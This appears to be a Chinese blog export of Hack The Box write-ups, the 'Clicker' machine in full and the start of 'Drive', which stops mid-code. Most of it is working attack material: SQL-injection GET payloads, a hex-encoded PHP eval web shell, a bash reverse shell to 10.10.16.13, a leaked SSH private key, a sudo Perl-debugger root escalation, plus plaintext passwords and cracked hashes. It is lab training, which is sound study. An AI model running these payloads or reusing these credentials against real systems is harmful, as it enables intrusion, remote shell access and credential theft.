admin.phpdrwxr-xr-x 4 kali kali 4096 2023年 2月28日 assets-rw-rw-r-- 1 kali kali 608 9月 2日 04:17 authenticate.php-rw-rw-r-- 1 kali kali 541 9月 2日 04:17 create_player.php-rw-rw-r-- 1 kali kali 2536 9月 2日 04:18 db_utils.php-rw-r--r-- 1 kali kali 1376 9月 2日 04:18 diagnostic.php-rw-rw-r-- 1 kali kali 1977 9月 2日 04:18 export.phpdrwxr-xr-x 2 kali kali 4096 9月 2日 04:18 exports-rw-rw-r-- 1 kali kali 3887 9月 2日 04:18 index.php-rw-rw-r-- 1 kali kali 3423 9月 2日 04:18 info.php-rw-rw-r-- 1 kali kali 3301 9月 2日 04:18 login.php-rw-rw-r-- 1 kali kali 74 9月 2日 04:17 logout.php-rw-rw-r-- 1 kali kali 3341 9月 2日 04:17 play.php-rw-rw-r-- 1 kali kali 3070 9月 2日 04:17 profile.php-rw-rw-r-- 1 kali kali 3333 9月 2日 04:18 register.php-rw-rw-r-- 1 kali kali 563 9月 2日 04:18 save_game.php 贴几个需要利用的文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#db_utils.php&lt;?phpsession_start();$db_server=&quot;localhost&quot;;$db_username=&quot;clicker_db_user&quot;;$db_password=&quot;clicker_db_password&quot;;$db_name=&quot;clicker&quot;;$mysqli = new mysqli($db_server, $db_username, $db_password, $db_name);$pdo = new PDO(&quot;mysql:dbname=$db_name;host=$db_server&quot;, $db_username, $db_password);function check_exists($player) { global $pdo; $params = [&quot;player&quot; =&gt; $player]; $stmt = $pdo-&gt;prepare(&quot;SELECT count(*) FROM players WHERE username = :player&quot;); $stmt-&gt;execute($params); $result = $stmt-&gt;fetchColumn(); if ($result &gt; 0) { return true; } return false;}function create_new_player($player, $password) { global $pdo; $params = [&quot;player&quot;=&gt;$player, &quot;password&quot;=&gt;hash(&quot;sha256&quot;, $password)]; $stmt = $pdo-&gt;prepare(&quot;INSERT INTO players(username, n, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)&quot;); $stmt-&gt;execute($params);}function check_auth($player, $password) { global $pdo; $params = [&quot;player&quot; =&gt; $player]; $stmt = $pdo-&gt;prepare(&quot;SELECT password FROM players WHERE username = :player&quot;); $stmt-&gt;execute($params); if ($stmt-&gt;rowCount() &gt; 0) { $row = $stmt-&gt;fetch(PDO::FETCH_ASSOC); if(strcmp($row['password'], hash(&quot;=&quot;,$password)) == 0){ return true; } } return false;}function load_profile($player) { global $pdo; $params = [&quot;player&quot;=&gt;$player]; $stmt = $pdo-&gt;prepare(&quot;SELECT nickname, role, clicks, level FROM players WHERE username = :player&quot;); $stmt-&gt;execute($params); if ($stmt-&gt;rowCount() &gt; 0) { $row = $stmt-&gt;fetch(PDO::FETCH_ASSOC); return $row; } return array();}function save_profile($player, $args) { global $pdo; $params = [&quot;player&quot;=&gt;$player]; $setStr = &quot;&quot;; foreach ($args as $key =&gt; $value) { $setStr .= $key . &quot;=&quot; . $pdo-&gt;quote($value) . &quot;,&quot;; } $setStr = rtrim($setStr, &quot;,&quot;); $stmt = $pdo-&gt;prepare(&quot;UPDATE players SET $setStr WHERE username = :player&quot;); $stmt -&gt; execute($params);}// ONLY FOR THE ADMINfunction get_top_players($number) { global $pdo; $stmt = $pdo-&gt;query(&quot;SELECT nickname,clicks,level FROM players WHERE clicks &gt;= &quot; . $number); $result = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC); return $result;}function get_current_player($player) { global $pdo; $stmt = $pdo-&gt;prepare(&quot;SELECT nickname, clicks, level FROM players WHERE username = :player&quot;); $stmt-&gt;bindParam(':player', $player, PDO::PARAM_STR); $stmt-&gt;execute(); if ($stmt-&gt;rowCount() &gt; 0) { $result = $stmt-&gt;fetch(PDO::FETCH_ASSOC); return $result; } else { return null; }}?&gt; 1234567891011121314151617181920212223#save_game.php&lt;?phpsession_start();include_once(&quot;db_utils.php&quot;);if (isset($_SESSION['PLAYER']) &amp;&amp; $_SESSION['PLAYER'] != &quot;&quot;) { $args = []; foreach($_GET as $key=&gt;$value) { if (strtolower($key) === 'role') { // prevent malicious users to modify role header('Location: /index.php?err=Malicious activity detected!'); die; } $args[$key] = $value; } save_profile($_SESSION['PLAYER'], $_GET); // update session info $_SESSION['CLICKS'] = $_GET['clicks']; $_SESSION['LEVEL'] = $_GET['level']; header('Location: /index.php?msg=Game has been saved!'); }?&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#export.php&lt;?phpsession_start();include_once(&quot;db_utils.php&quot;);if ($_SESSION[&quot;ROLE&quot;] != &quot;Admin&quot;) { header('Location: /index.php'); die;}function random_string($length) { $key = ''; $keys = array_merge(range(0, 9), range('a', 'z')); for ($i = 0; $i &lt; $length; $i++) { $key .= $keys[array_rand($keys)]; } return $key;}$threshold = 1000000;if (isset($_POST[&quot;threshold&quot;]) &amp;&amp; is_numeric($_POST[&quot;threshold&quot;])) { $threshold = $_POST[&quot;threshold&quot;];}$data = get_top_players($threshold);$currentplayer = get_current_player($_SESSION[&quot;PLAYER&quot;]);$s = &quot;&quot;;if ($_POST[&quot;extension&quot;] == &quot;txt&quot;) { $s .= &quot;Nickname: &quot;. $currentplayer[&quot;nickname&quot;] . &quot; Clicks: &quot; . $currentplayer[&quot;clicks&quot;] . &quot; Level: &quot; . $currentplayer[&quot;level&quot;] . &quot;\\n&quot;; foreach ($data as $player) { $s .= &quot;Nickname: &quot;. $player[&quot;nickname&quot;] . &quot; Clicks: &quot; . $player[&quot;clicks&quot;] . &quot; Level: &quot; . $player[&quot;level&quot;] . &quot;\\n&quot;; }} elseif ($_POST[&quot;extension&quot;] == &quot;json&quot;) { $s .= json_encode($currentplayer); $s .= json_encode($data);} else { $s .= '&lt;table&gt;'; $s .= '&lt;thead&gt;'; $s .= ' &lt;tr&gt;'; $s .= ' &lt;th scope=&quot;col&quot;&gt;Nickname&lt;/th&gt;'; $s .= ' &lt;th scope=&quot;col&quot;&gt;Clicks&lt;/th&gt;'; $s .= ' &lt;th scope=&quot;col&quot;&gt;Level&lt;/th&gt;'; $s .= ' &lt;/tr&gt;'; $s .= '&lt;/thead&gt;'; $s .= '&lt;tbody&gt;'; $s .= ' &lt;tr&gt;'; $s .= ' &lt;th scope=&quot;row&quot;&gt;' . $currentplayer[&quot;nickname&quot;] . '&lt;/th&gt;'; $s .= ' &lt;td&gt;' . $currentplayer[&quot;clicks&quot;] . '&lt;/td&gt;'; $s .= ' &lt;td&gt;' . $currentplayer[&quot;level&quot;] . '&lt;/td&gt;'; $s .= ' &lt;/tr&gt;'; foreach ($data as $player) { $s .= ' &lt;tr&gt;'; $s .= ' &lt;th scope=&quot;row&quot;&gt;' . $player[&quot;nickname&quot;] . '&lt;/th&gt;'; $s .= ' &lt;td&gt;' . $player[&quot;clicks&quot;] . '&lt;/td&gt;'; $s .= ' &lt;td&gt;' . $player[&quot;level&quot;] . '&lt;/td&gt;'; $s .= ' &lt;/tr&gt;'; } $s .= '&lt;/tbody&gt;'; $s .= '&lt;/table&gt;';} $filename = &quot;exports/top_players_&quot; . random_string(8) . &quot;.&quot; . $_POST[&quot;extension&quot;];file_put_contents($filename, $s);header('Location: /admin.php?msg=Data has been saved in ' . $filename);?&gt; 漏洞利用(update注入)升级roledb_utils.php文件中的save_profile函数存在sql注入：update; 利用链：play.php ==&gt; save_game.php ==&gt; db_utils.php ==&gt;save_profile 1234567891011function save_profile($player, $args) { global $pdo; $params = [&quot;player&quot;=&gt;$player]; $setStr = &quot;&quot;; foreach ($args as $key =&gt; $value) { $setStr .= $key . &quot;=&quot; . $pdo-&gt;quote($value) . &quot;,&quot;; } $setStr = rtrim($setStr, &quot;,&quot;); $stmt = $pdo-&gt;prepare(&quot;UPDATE players SET $setStr WHERE username = :player&quot;); $stmt -&gt; execute($params);} :player 占位符表示一个玩家的用户名，它将在执行查询时被 $params 数组中对应的值所替换。这种做法可以确保 SQL 查询的安全性;但是$setStr没有使用占用符号；存在注入点; 并且$args变量是通过save_game.php文件的foreach($_GET as $key=&gt;$value)函数，我们完全可以控制；即使在save_game.php文件对上传的GET参数的键值不能为role做了限制，也可以轻松绕过； 1234if (strtolower($key) === 'role') { header('Location: /index.php?err=Malicious activity detected!'); die; } 方法一将role%3d&quot;Admin&quot;%23当作键值绕过检查，再用#注释后面的内容 1UPDATE players SET role=&quot;Admin&quot;# WHERE username = :player 1GET /save_game.php?clicks=0&amp;level=0&amp;role%3d&quot;Admin&quot;%23 方法二利用/**/绕过strtolower($key) === 'role' 1UPDATE players SET role/**/=&quot;Admin&quot; WHERE username = :player 1GET /save_game.php?clicks=0&amp;level=0&amp;role%2f%2a%2a%2f=Admin 👆🐎export.php中存在危险函数file_put_contents($filename, $s);,先来看看$filename是怎么来的，如下： “exports/top_players_”加上8个随机字符，变量名为extension的post传参(这里没有对后缀做检查，可以修改后缀为php等)；所以文件后缀是我们可以控制的; 1$filename = &quot;exports/top_players_&quot; . random_string(8) . &quot;.&quot; . $_POST[&quot;extension&quot;]; 再来看看$s变量是怎么来的；当后缀不是txt,json时 其中$currentplayer[&quot;nickname&quot;],$currentplayer[&quot;clicks&quot;] ,$currentplayer[&quot;level&quot;];三个变量是我们可以控制的； 而$currentplayer[&quot;clicks&quot;] ,$currentplayer[&quot;level&quot;]的数据类型是数字，所以只能在nickname动手； &quot;nickname&quot;的值也可以通过update注入来改变； 1GET /save_game.php?clicks=1000001&amp;level=0&amp;nickname=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%73%68%65%6c%6c%27%5d%29%3b%3f%3e 在抓包将后缀改为php;extension=php 反弹shell 1POST:shell=system('%2Fbin%2Fbash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F5555%200%3E%261%22'); user_www-data思路应该先去数据库里找敏感信息，找不到再搜集别的敏感信息； 12bash-5.1$ find / -perm -4000 2&gt;/dev/null/opt/manage/execute_query 将jack用户的suid文件：/opt/manage/execute_query下载到本地查看 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657main(){if ( argc &gt; 1 ) { v8 = atoi(argv[1]); dest = (char *)calloc(0x14uLL, 1uLL); switch ( v8 ) { case 0: puts(&quot;ERROR: Invalid arguments&quot;); return 2; case 1: strncpy(dest, &quot;create.sql&quot;, 0x14uLL); goto LABEL_10; case 2: strncpy(dest, &quot;populate.sql&quot;, 0x14uLL); goto LABEL_10; case 3: strncpy(dest, &quot;reset_password.sql&quot;, 0x14uLL); goto LABEL_10; case 4: strncpy(dest, &quot;clean.sql&quot;, 0x14uLL); goto LABEL_10; default: strncpy(dest, argv[2], 0x14uLL);LABEL_10: strcpy(s, &quot;/home/jack/queries/&quot;); v4 = strlen(s); v5 = strlen(dest); name = (char *)calloc(v4 + v5 + 1, 1uLL); strcat(name, s); strcat(name, dest); setreuid(0x3E8u, 0x3E8u); if ( access(name, 4) ) { puts(&quot;File not readable or not found&quot;); } else { strcpy(src, &quot;/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v &lt; &quot;); v6 = strlen(src); v7 = strlen(dest); command = (char *)calloc(v6 + v7 + 1, 1uLL); strcat(command, src); strcat(command, name); system(command); } result = 0; break; } } else { puts(&quot;ERROR: not enough arguments&quot;); return 1; } return result;} 12/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v &lt; clean.sql#&lt; clean.sql 表示从名为 clean.sql 的文件中读取 SQL 命令，并将其发送到 MySQL 服务器以执行 这里有意思的是即使不是sql文件也可以读取； 123456789101112131415161718192021222324252627282930313233343536373839404142bash-5.1$ /opt/manage/execute_query 5 ../.ssh/id_rsamysql: [Warning] Using a password on the command line interface can be insecure.-------------------BEGIN OPENSSH PRIVATE KEY---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-----END OPENSSH PRIVATE KEY----------------- id_rsa 是 SSH 密钥文件的默认名称之一。在 SSH 密钥认证中，id_rsa 是私钥文件的默认名称，而 id_rsa.pub 是相应的公钥文件的默认名称。这些文件通常用于 SSH 客户端与服务器进行安全连接和身份验证。私钥文件（id_rsa）应该被妥善保管，而公钥文件（id_rsa.pub）通常被放置在需要进行身份验证的服务器上的 .ssh/authorized_keys 文件中。 SSH 密钥对通常用于替代传统的基于密码的身份验证，提供了更高的安全性。 这里读取的文件格式有点问题第一行和最后一行少了两个-符号，加上去，还需要将权限改成只读，否则不让连接： 12345678910┌──(kali㉿kali)-[~]└─$ ssh -i id_rsa -l jack 10.10.11.232@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0644 for 'id_rsa' are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key &quot;id_rsa&quot;: bad permissionsjack@10.10.11.232's password: 改成只读就好了，再用ssh连接即可； 1chmod 400 id_rsa user_jack提权12345678-bash-5.1$ sudo -lMatching Defaults entries for jack on clicker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser jack may run the following commands on clicker: (ALL : ALL) ALL (root) SETENV: NOPASSWD: /opt/monitor.sh 12345678910111213141516171819-bash-5.1$ cat /opt/monitor.sh#!/bin/bashif [ &quot;$EUID&quot; -ne 0 ]#id不为0 then echo &quot;Error, please run as root&quot; exitfiset PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binunset PERL5LIB;unset PERLLIB;data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);/usr/bin/xml_pp &lt;&lt;&lt; $data;if [[ $NOSAVE == &quot;true&quot; ]]; then exit;else timestamp=$(/usr/bin/date +%s) /usr/bin/echo $data &gt; /root/diagnostic_files/diagnostic_${timestamp}.xmlfi 其中； 12345678910unset PERL5LIB;unset PERLLIB;这两行命令是用于在Unix/Linux操作系统下取消设置环境变量的命令。让我为您解释每个命令的含义：unset PERL5LIB;：这个命令用于取消设置名为PERL5LIB的环境变量。PERL5LIB是一个用于指定Perl编程语言库路径的环境变量。通常情况下，它用于告诉Perl解释器在哪里查找Perl模块和库文件。通过运行这个命令，您将从环境中移除PERL5LIB变量的定义，使得Perl不再使用该变量来定位模块和库文件。unset PERLLIB;：这个命令用于取消设置名为PERLLIB的环境变量。类似于PERL5LIB，PERLLIB也是用于指定Perl库路径的环境变量。运行这个命令将从环境中移除PERLLIB变量的定义，停止使用它来定位Perl模块和库文件。取消设置这些环境变量通常是在需要恢复到默认Perl库路径或在特定情况下不希望使用这些自定义路径时使用的。它们在确保Perl在特定上下文中使用默认设置时非常有用。 应该时为了预防通过更改这两个环境变量来进行攻击，这说明了里面有perl写的程序。应该是/usr/bin/xml_pp，但是除了两个环境变量是危险的，还有两个。 **PERL5OPT=-d**：这部分将 PERL5OPT 环境变量设置为 d。在Perl中，d 选项用于启动调试器，它允许您在代码执行过程中进行调试。通常情况下，这是一个合法的用法，用于在开发和调试Perl脚本时启用调试功能。 **PERL5DB='system(&quot;chmod u+s /bin/bash&quot;);'**：这部分将 PERL5DB 环境变量设置为一个Perl表达式。这个Perl表达式看起来是一个恶意的命令，它试图在Perl调试器环境中运行 **system(&quot;chmod u+s /bin/bash&quot;);**。这个命令的目的是在系统中为 /bin/bash 这个Shell程序设置了用户可执行的SUID（Set User ID）权限，这将使得任何用户都能以超级用户的权限运行 **/bin/bash**，这是非常危险和不安全的操作。 大概意思是在执行perl程序时开启调试，然后再调试时运行**system(&quot;chmod u+s /bin/bash&quot;);** 执行 1sudo PERL5OPT=-d PERL5DB='system(&quot;chmod u+s /bin/bash&quot;);' /opt/monitor.sh 12345678-bash-5.1$ sudo PERL5OPT=-d PERL5DB='system(&quot;chmod u+s /bin/bash&quot;);' /opt/monitor.shNo DB::DB routine defined at /usr/bin/xml_pp line 9.No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.END failed--call queue aborted.-bash-5.1$ bash -pbash-5.1# iduid=1000(jack) gid=1000(jack) euid=0(root) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)bash-5.1# 补充升级shell命令 1script /dev/null -c++","link":"/2023/12/14/Clicker(HTB)/"},{"title":"Drive(HTB)","text":"信息搜集nmap12345678910111213141516nmap -sC -sV 10.10.11.235Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-15 14:49 CSTNmap scan report for drive.htb (10.10.11.235)Host is up (0.18s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)| 256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)|_ 256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Doodle Grive|_http-server-header: nginx/1.18.0 (Ubuntu)3000/tcp filtered pppService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 寻找漏洞http://drive.htb/一个注册和登陆的功能，随意注册一个账号尝试登陆 我们尝试上传两个文件并且查看， 注意查看的url一个文件似乎对应着一个ID；我们尝试从别的ID的得别的文件来泄露一些敏感文件 利用bp工具的Intruder模块来爆破； 200：表示您有权访问该文件。 401：表示对文件的访问被拒绝，这是我们主要寻找的。 500：表示没有与该特定ID关联的文件。 发现ID为79,98,99,101下有文件但是我们无权查看，通过广泛的枚举，我们发现了一个潜在的攻击载体，其形式为/block链接。值得注意的是，此链接不会验证文件的所有者，这意味着我们可能会保留我们无法访问的文件。也就是这个漏洞导致我们可以查看到其他文件 在ID为79的文件下得到了敏感信息；访问http://drive.htb/79/block/ 123456hey team after the great success of the platform we need now to continue the work.on the new features for ours platform.I have created a user for martin on the server to make the workflow easier for you please use the password &quot;Xk4@KjyrYv8t194L!&quot;.please make the necessary changes to the code before the end of the monthI will reach you soon with the token to apply your changes on the repothanks! ssh登陆 12ssh martin@10.10.11.235password:Xk4@KjyrYv8t194L! User_martinbackups在/var/www/backups目录下发现一些备份文件，下载到本地，尝试得到敏感信息； 123456789martin@drive:/var/www/backups$ pwd/var/www/backupsmartin@drive:/var/www/backups$ ls -ltotal 3732-rw-r--r-- 1 www-data www-data 13018 Sep 1 20:00 1_Dec_db_backup.sqlite3.7z-rw-r--r-- 1 www-data www-data 12226 Sep 1 20:00 1_Nov_db_backup.sqlite3.7z-rw-r--r-- 1 www-data www-data 12722 Sep 1 20:00 1_Oct_db_backup.sqlite3.7z-rw-r--r-- 1 www-data www-data 12770 Sep 1 20:00 1_Sep_db_backup.sqlite3.7z-rwxr-xr-x 1 root root 3760128 Dec 26 2022 db.sqlite3 下载到本地之后，会发现解压需要密码，并且db.sqlite3中并没有可以利用的信息 gitea下一步是搜索重要文件，果不其然存在一个gitea文件，Gitea是一个基于Go语言的开源自助Git服务，类似于GitHub或GitLab。它提供了一个轻量级的、易于安装和管理的Git服务，可以在自己的服务器上搭建私有的Git仓库。 123456789101112131415martin@drive:/usr/local/bin$ lscygdb cython cythonize django-admin gitea gunicorn pipreqs sqlformatmartin@drive:/usr/local/bin$ ./gitea2023/12/15 07:19:00 cmd/web.go:106:runWeb() [I] Starting Gitea on PID: 6652922023/12/15 07:19:00 .../setting/packages.go:44:newPackages() [E] Unable to create chunked upload directory: /usr/local/bin/data/tmp/package-upload (mkdir /usr/local/bin/data: permission denied)2023/12/15 07:19:00 ...s/install/setting.go:21:PreloadSettings() [I] AppPath: /usr/local/bin/gitea2023/12/15 07:19:00 ...s/install/setting.go:22:PreloadSettings() [I] AppWorkPath: /usr/local/bin2023/12/15 07:19:00 ...s/install/setting.go:23:PreloadSettings() [I] Custom path: /usr/local/bin/custom2023/12/15 07:19:00 ...s/install/setting.go:24:PreloadSettings() [I] Log path: /usr/local/bin/log2023/12/15 07:19:00 ...s/install/setting.go:25:PreloadSettings() [I] Configuration file: /usr/local/bin/custom/conf/app.ini2023/12/15 07:19:00 ...s/install/setting.go:26:PreloadSettings() [I] Prepare to run install page2023/12/15 07:19:01 ...s/install/setting.go:29:PreloadSettings() [I] SQLite3 is supported2023/12/15 07:19:02 cmd/web.go:217:listen() [I] [657bfde6] Listen: http://0.0.0.0:30002023/12/15 07:19:02 cmd/web.go:221:listen() [I] [657bfde6] AppURL(ROOT_URL): http://localhost:3000/2023/12/15 07:19:02 ...s/graceful/server.go:61:NewServer() [I] [657bfde6] Starting new Web server: tcp:0.0.0.0:3000 并且gitea监听3000端口；我们尝试端口转发到本地，使得本地可以访问； 执行这条命令后，当你访问localhost:3000时，实际上会建立一个SSH隧道，将流量从你的本地主机的3000端口转发到drive.htb主机的3000端口。这意味着任何发送到localhost:3000的流量都会通过SSH连接被转发到drive.htb主机上运行的服务。 因此，如果drive.htb主机上确实有一个服务在3000端口上运行，并且SSH连接也已经建立，那么当你访问localhost:3000时，你应该能够访问到drive.htb主机上对应的服务。这种方式可以让你通过SSH连接来访问远程主机上的服务，而不需要直接暴露这些服务在公共网络上。 12ssh martin@10.10.11.235 -L 3000:drive.htb:3000password:Xk4@KjyrYv8t194L! email:martin@drive.htb；password:Xk4@KjyrYv8t194L!成功登陆；只有一个仓库，在DoodleGrive/db_backup.sh下搜集到到了解压文件的密码：H@ckThisP@ssW0rDIfY0uC@n:) 12345678910111213#!/bin/bashDB=$1date_str=$(date +'%d_%b')7z a -p'H@ckThisP@ssW0rDIfY0uC@n:)' /var/www/backups/${date_str}_db_backup.sqlite3.7z db.sqlite3cd /var/www/backups/ls -l --sort=t *.7z &gt; backups_num.tmpbackups_num=$(cat backups_num.tmp | wc -l)if [[ $backups_num -gt 10 ]]; then #backups is more than 10... deleting to oldest backup rm $(ls *.7z --sort=t --color=never | tail -1) #oldest backup deleted successfully!firm backups_num.tmp 解压文件7z解压 1237z x 1_Nov_db_backup.sqlite3.7z -oname_Nov7z x 1_Oct_db_backup.sqlite3.7z -oname_Oct...... hashcat破解密码，密码不止一个，枚举尝试得到了正确passwd:johnmayer7 1234567hashcat -m 124 -a 0 --force -O tests /usr/share/wordlists/rockyou.txthashcat tests --show sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141:johniscoolsha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004:john316sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93:john boy User_tom12ssh tom@10.10.11.235passwd:johnmayer7 代码分析12find / -perm -4000 2&gt;/dev/null/home/tom/doodleGrive-cli 将文件下载到本地查看； main函数存在格式字符串漏洞+栈溢出 1234567891011121314151617181920212223242526272829303132333435363738int __cdecl main(int argc, const char **argv, const char **envp){ int v3; // edx int v4; // ecx int v5; // r8d int v6; // r9d int v7; // edx int v8; // ecx int v9; // r8d int v10; // r9d char v12[16]; // [rsp+0h] [rbp-50h] BYREF char v13[56]; // [rsp+10h] [rbp-40h] BYREF unsigned __int64 v14; // [rsp+48h] [rbp-8h] v14 = __readfsqword(0x28u); setenv(&quot;PATH&quot;, &amp;unk_4973A8, 1LL); setuid(0LL); setgid(0LL); puts(&quot;[!]Caution this tool still in the development phase...please report any issue to the development team[!]&quot;); puts(&quot;Enter Username:&quot;); fgets(v12, 16LL, stdin); sanitize_string(v12); printf(&quot;Enter password for &quot;, 16, v3, v4, v5, v6, v12[0]); printf(v12, 16, v7, v8, v9, v10, v12[0]); puts(&quot;:&quot;); fgets(v13, 400LL, stdin); sanitize_string(v13); if ( j_strcmp_ifunc(v12, &quot;moriarty&quot;) || j_strcmp_ifunc(v13, &quot;findMeIfY0uC@nMr.Holmz!&quot;) ) { puts(&quot;Invalid username or password.&quot;); } else { puts(&quot;Welcome...!&quot;); main_menu(); } return 0;} main_menu()函数是一些执行sqlite3的一些功能 123456789101112131415161718192021222324 switch ( v6[0] ) { case '1': show_users_list(); break; case '2': show_groups_list(); break; case '3': show_server_status(); break; case '4': show_server_log(); break; case '5': activate_user_account(); break; case '6': puts(&quot;exiting...&quot;); exit(0LL); default: puts(&quot;please Select a valid option...&quot;); break;} 其中activate_user_account函数存在sql注入 12345678910111213141516171819202122printf(&quot;Enter username to activate account: &quot;, a2, a3, a4, a5, a6, v13[0]);fgets(v13, 40LL, stdin);v13[j_strcspn_ifunc(v13, &quot;\\n&quot;)] = 0;if ( v13[0] ){ sanitize_string(v13); snprintf( v14, 250, 